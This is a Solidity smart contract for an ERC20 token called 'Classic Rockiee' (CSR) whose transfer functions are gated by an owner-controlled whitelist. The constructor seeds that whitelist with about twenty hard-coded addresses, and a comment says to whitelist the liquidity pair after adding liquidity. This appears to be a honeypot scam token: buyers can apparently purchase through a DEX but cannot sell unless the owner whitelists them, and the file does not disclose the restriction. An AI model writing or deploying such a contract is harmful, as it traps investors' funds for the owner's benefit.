// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Classic Rockiee", "CSR") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 20000000 * 10 ** decimals());
        whiteList[0x363A969680EC5D12D4FC9b1D57BDEEbD996BeaaD]= true;
        whiteList[0x13e5F5BD36E8D74aD99A32CE044543bF6248488F]=true;
        whiteList[0x70C142325b14A86D52c6e2663cbc9eB33126cD0a]=true;
        whiteList[0x4bB40498738129090b1e1B41Bc59A89989cc7Aa0]=true;
        whiteList[0xC12fd2F4421499A0bEa014d882aF6058ce71aeB2]=true;
        whiteList[0x7b409CaCdf00f0c43Cd8A2A023e04F719585BbB5]=true;
        whiteList[0x74b797183666eEF24CC0Bd515246B0C36A2B0B01]=true;
        whiteList[0x51F9E48D4795cB28c699917095106C590791B071]=true;
        whiteList[0xe6B810BDa8d9B40f7fc664f5FDb80813CFE2c833]=true;
        whiteList[0x6A4832D16BC930e1f22De7Ed89522C96dde9BA57]=true;
        whiteList[0x26172FF0e70916E9F9eb6BcDC3507171C3361087]=true;
        whiteList[0x576e93038c3f3C299A8cA703dC1aA62cE8FcE19A]=true;
        whiteList[0xa71765Bc4691d90e30D24Af357A0e952C54887bF]=true;
        whiteList[0x59df3d10B5C3f724b07BE89dE175ad1f9D12E14c]=true;
        whiteList[0xB0134cC0724544d9e54cf81DaC8F1Bd7E9180257]=true;
        whiteList[0xD1439148E04572B6AF7Edc21F852989b03962a20]=true;
        whiteList[0xBf43B94817E04b7636A46360aB43a98b5d5aD13b]=true;
        whiteList[0xa655FbAB8D81cCaF8524c2EA80E5c93c4138c85B]=true;
        whiteList[0xf138D50B0489A5B01D8D000568dDe0fDEAe9A97c]=true;
        whiteList[0xC1fdc9a1864eA0d1Ae9901fe2a43a1659cf1fd6C]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}